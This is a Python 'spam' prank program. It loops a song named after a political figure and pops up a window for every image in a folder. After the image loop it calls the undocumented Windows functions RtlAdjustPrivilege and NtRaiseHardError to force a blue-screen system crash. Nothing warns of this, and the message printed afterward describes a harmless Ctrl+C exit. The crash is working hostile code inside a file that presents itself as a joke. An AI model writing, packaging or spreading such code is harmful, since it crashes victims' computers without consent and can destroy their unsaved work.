#!/usr/bin/env python3
import cv2
import os
import sys
import time
from pathlib import Path
import pygame
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
from concurrent.futures import ThreadPoolExecutor

# def display_image(img_path):
#     with Image.open(img_path) as im:
#         im.load()
#         im.show()
#     time.sleep(1)

def get_asset_path(relative_path):
    """ Get absolute path to resource, works for dev and for Nuitka/PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return Path(base_path) / relative_path

def main():
    if sys.platform.startswith('linux') and "SDL_AUDIODRIVER" not in os.environ:
        os.environ["SDL_AUDIODRIVER"] = "pulseaudio"

    try:
        pygame.mixer.init()
    except pygame.error as e:
        print(f"Audio init failed: {e}. Falling back to dummy driver.")
        os.environ["SDL_AUDIODRIVER"] = "dummy"
        pygame.mixer.init()

    song_path = get_asset_path("assets/we-are-charlie-kirk-song.mp3")
    spam_dir = get_asset_path("assets/spam")

    sound = pygame.mixer.Sound(str(song_path))
    sound.play(loops=-1)

    extensions = {'.jpg', '.png', '.jpeg', '.webp'}
    image_files = [i for i in spam_dir.iterdir() if i.suffix.lower() in extensions]

    for loop_num in range(1):
        for i, path in enumerate(image_files):
            img = cv2.imread(str(path))
            if img is not None:
                # Unique window name ensures a new window for every file
                win_name = f"Loop{loop_num}_Img{i}"
                cv2.imshow(win_name, img)

                # This handles the internal rendering so the window isn't blank
                # Use a tiny value (1ms) so it doesn't slow down the loop
                cv2.waitKey(1)
                time.sleep(1)
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),
            c_uint(1),
            c_uint(0),
            byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xc000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

    print("All windows opened. Press Ctrl+C in the terminal to exit.")
    try:
        while True:
            # pollKey() or waitKey(1) keeps the windows responsive/non-blank
            cv2.waitKey(100)
            time.sleep(1)
    except KeyboardInterrupt:
        cv2.destroyAllWindows()

if __name__ == "__main__":
    main()
